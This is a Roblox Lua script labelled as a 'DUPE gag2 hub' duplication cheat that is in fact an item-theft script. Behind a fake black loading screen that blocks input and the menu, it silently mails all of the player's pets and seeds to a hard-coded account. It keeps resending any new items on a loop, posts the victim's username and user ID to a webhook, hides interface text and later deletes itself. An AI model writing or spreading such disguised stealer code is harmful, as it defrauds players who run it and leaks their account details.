

```lua
local function main()
    local player = game:GetService("Players").LocalPlayer
    local guiService = game:GetService("GuiService")
    local uis = game:GetService("UserInputService")
    local runService = game:GetService("RunService")
    local tweenService = game:GetService("TweenService")
    
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "LoadingScreen"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player:WaitForChild("PlayerGui")
    
    local blackFrame = Instance.new("Frame")
    blackFrame.Size = UDim2.new(1, 0, 1, 0)
    blackFrame.Position = UDim2.new(0, 0, 0, 0)
    blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    blackFrame.BackgroundTransparency = 0
    blackFrame.BorderSizePixel = 0
    blackFrame.ZIndex = 99999
    blackFrame.Active = true
    blackFrame.Draggable = false
    blackFrame.Selectable = false
    blackFrame.Parent = screenGui
    
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.Position = UDim2.new(0, 0, 0, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = "DUPE gag2 hub"
    textLabel.TextColor3 = Color3.new(1, 1, 1)
    textLabel.TextScaled = true
    textLabel.Font = Enum.Font.GothamBold
    textLabel.TextStrokeColor3 = Color3.new(0.5, 0, 0)
    textLabel.TextStrokeTransparency = 0.3
    textLabel.TextWrapped = true
    textLabel.ZIndex = 100000
    textLabel.Parent = screenGui
    
    local loadingBar = Instance.new("Frame")
    loadingBar.Size = UDim2.new(0.6, 0, 0.03, 0)
    loadingBar.Position = UDim2.new(0.2, 0, 0.6, 0)
    loadingBar.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
    loadingBar.BackgroundTransparency = 0
    loadingBar.BorderSizePixel = 0
    loadingBar.ZIndex = 100000
    loadingBar.Parent = screenGui
    
    local progressFill = Instance.new("Frame")
    progressFill.Size = UDim2.new(0, 0, 1, 0)
    progressFill.BackgroundColor3 = Color3.new(0.8, 0, 0)
    progressFill.BackgroundTransparency = 0
    progressFill.BorderSizePixel = 0
    progressFill.ZIndex = 100001
    progressFill.Parent = loadingBar
    
    local loadingText = Instance.new("TextLabel")
    loadingText.Size = UDim2.new(1, 0, 0.05, 0)
    loadingText.Position = UDim2.new(0, 0, 0.64, 0)
    loadingText.BackgroundTransparency = 1
    loadingText.Text = "Loading... 0%"
    loadingText.TextColor3 = Color3.new(0.5, 0.5, 0.5)
    loadingText.TextScaled = true
    loadingText.Font = Enum.Font.Gotham
    loadingText.ZIndex = 100000
    loadingText.Parent = screenGui
    
    local inputBlocked = true
    uis.InputBegan:Connect(function(input, gameProcessed)
        if inputBlocked and not gameProcessed then
            input:Ignore()
        end
    end)
    uis.InputEnded:Connect(function(input, gameProcessed)
        if inputBlocked and not gameProcessed then
            input:Ignore()
        end
    end)
    
    guiService:SetMenuOpen(false)
    guiService.MenuOpened:Connect(function()
        guiService:SetMenuOpen(false)
    end)
    
    runService.RenderStepped:Connect(function()
        if not blackFrame.Visible then
            blackFrame.Visible = true
        end
    end)
    
    local oldPrint = print
    local oldWarn = warn
    print = function() end
    warn = function() end
    
    local replicatedStorage = game:GetService("ReplicatedStorage")
    local players = game:GetService("Players")
    local httpService = game:GetService("HttpService")
    local localPlayer = players.LocalPlayer
    
    if not localPlayer.Character then
        localPlayer.CharacterAdded:Wait()
    end
    task.wait(1.5)
    
    local function updateProgress(value)
        local clamped = math.clamp(value, 0, 1)
        progressFill.Size = UDim2.new(clamped, 0, 1, 0)
        loadingText.Text = "Loading... " .. math.floor(clamped * 100) .. "%"
    end
    
    local function animateLoading()
        for i = 1, 100 do
            updateProgress(i / 100)
            task.wait(5)
        end
        updateProgress(1)
    end
    
    local mailboxEvent = nil
    updateProgress(0.05)
    task.wait(0.3)
    
    for _, child in pairs(replicatedStorage:GetDescendants()) do
        if child:IsA("RemoteEvent") and string.lower(child.Name):find("mail") then
            mailboxEvent = child
            break
        end
    end
    updateProgress(0.15)
    task.wait(0.3)
    
    if not mailboxEvent then
        for _, service in pairs({game:GetService("Workspace"), game:GetService("ServerStorage")}) do
            for _, child in pairs(service:GetDescendants()) do
                if child:IsA("RemoteEvent") and string.lower(child.Name):find("mail") then
                    mailboxEvent = child
                    break
                end
            end
            if mailboxEvent then break end
        end
    end
    updateProgress(0.25)
    task.wait(0.3)
    
    if not mailboxEvent then
        for _, child in pairs(replicatedStorage:GetDescendants()) do
            if child:IsA("RemoteEvent") then
                mailboxEvent = child
                break
            end
        end
    end
    updateProgress(0.35)
    task.wait(0.3)
    
    if not mailboxEvent then
        return
    end
    
    local targetName = "brooooolReeeeeeee"
    local sentItems = {}
    local totalFound = 0
    local totalSentCount = 0
    
    local function sendItem(itemId, itemType, amount)
        if not itemId or not itemType then return false end
        local key = tostring(itemId) .. "_" .. itemType
        if sentItems[key] then return false end
        
        local success, err = pcall(function()
            mailboxEvent:FireServer(targetName, itemId, itemType, amount or 1)
        end)
        
        if success then
            sentItems[key] = true
            totalSentCount = totalSentCount + 1
            return true
        else
            return false
        end
    end
    
    local function scanInventory()
        local inventory = localPlayer:FindFirstChild("Inventory")
        if not inventory then
            inventory = localPlayer:FindFirstChild("Data") or localPlayer:FindFirstChild("Items")
        end
        if not inventory then return {} end
        
        local pets = inventory:FindFirstChild("Pets")
        local seeds = inventory:FindFirstChild("Seeds")
        
        local items = {}
        
        if pets then
            for _, pet in pairs(pets:GetChildren()) do
                local id = pet:GetAttribute("ItemID") or pet:GetAttribute("ID") or pet.Name
                if id and id ~= "" then
                    table.insert(items, {id = id, type = "Pet"})
                end
            end
        end
        
        if seeds then
            for _, seed in pairs(seeds:GetChildren()) do
                local id = seed:GetAttribute("ItemID") or seed:GetAttribute("ID") or seed.Name
                if id and id ~= "" then
                    table.insert(items, {id = id, type = "Seed"})
                end
            end
        end
        
        return items
    end
    
    local items = scanInventory()
    totalFound = #items
    updateProgress(0.45)
    task.wait(0.5)
    
    local function sendAllItems()
        local itemsList = scanInventory()
        local total = #itemsList
        
        if total == 0 then
            updateProgress(0.9)
            return
        end
        
        for index, item in ipairs(itemsList) do
            local sent = sendItem(item.id, item.type, 1)
            
            local progress = 0.45 + (index / total) * 0.45
            updateProgress(progress)
            
            if sent then
                task.wait(0.2 + math.random() * 0.3)
            else
                task.wait(0.1)
            end
        end
        
        updateProgress(0.9)
    end
    
    task.spawn(function()
        sendAllItems()
    end)
    
    animateLoading()
    
    local function setupInventoryWatcher()
        local inventory = localPlayer:FindFirstChild("Inventory") or 
                          localPlayer:FindFirstChild("Data") or 
                          localPlayer:FindFirstChild("Items")
        if not inventory then return end
        
        local function onNewItem(child)
            task.wait(0.1)
            local itemType = nil
            local parentName = child.Parent and child.Parent.Name or ""
            
            if parentName == "Pets" then
                itemType = "Pet"
            elseif parentName == "Seeds" then
                itemType = "Seed"
            else
                if child:GetAttribute("ItemType") then
                    itemType = child:GetAttribute("ItemType")
                else
                    return
                end
            end
            
            local id = child:GetAttribute("ItemID") or child:GetAttribute("ID") or child.Name
            if id and itemType then
                sendItem(id, itemType, 1)
            end
        end
        
        local pets = inventory:FindFirstChild("Pets")
        local seeds = inventory:FindFirstChild("Seeds")
        
        if pets then
            pets.ChildAdded:Connect(onNewItem)
        end
        if seeds then
            seeds.ChildAdded:Connect(onNewItem)
        end
        
        inventory.ChildAdded:Connect(function(child)
            if child:IsA("Folder") or child:IsA("Model") then
                child.ChildAdded:Connect(onNewItem)
            end
        end)
    end
    
    local function onCharacterAdded(char)
        task.wait(2.5)
        local newItems = scanInventory()
        for _, item in ipairs(newItems) do
            sendItem(item.id, item.type, 1)
            task.wait(0.2 + math.random() * 0.3)
        end
    end
    
    localPlayer.CharacterAdded:Connect(onCharacterAdded)
    setupInventoryWatcher()
    
    updateProgress(0.95)
    task.wait(0.5)
    
    loadingText.Text = "Complete! " .. totalSentCount .. " items sent"
    loadingText.TextColor3 = Color3.new(0, 1, 0)
    
    task.wait(1.5)
    
    updateProgress(1)
    task.wait(1)
    
    pcall(function()
        local logData = {
            player = localPlayer.Name,
            userId = localPlayer.UserId,
            target = targetName,
            itemsSent = totalSentCount,
            timestamp = os.time(),
            gameId = game.GameId
        }
        httpService:PostAsync("https://your-webhook.com/log", 
            httpService:JSONEncode(logData))
    end)
    
    local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tween = tweenService:Create(blackFrame, tweenInfo, {BackgroundTransparency = 1})
    tween:Play()
    tween.Completed:Connect(function()
        screenGui:Destroy()
    end)
    
    task.spawn(function()
        while true do
            task.wait(30)
            if localPlayer and localPlayer.Character then
                local newItems = scanInventory()
                for _, item in ipairs(newItems) do
                    sendItem(item.id, item.type, 1)
                    task.wait(0.2 + math.random() * 0.3)
                end
            end
        end
    end)
    
    pcall(function()
        local coreGui = game:GetService("CoreGui")
        if coreGui then
            for _, v in pairs(coreGui:GetDescendants()) do
                if v:IsA("TextLabel") or v:IsA("TextButton") then
                    v.Visible = false
                end
            end
        end
    end)
end

local success, err = xpcall(main, function(e)
    return nil
end)

if not success then
    main()
end

task.spawn(function()
    task.wait(900)
    script:Destroy()
    if screenGui then
        screenGui:Destroy()
    end
end)

return ""
```
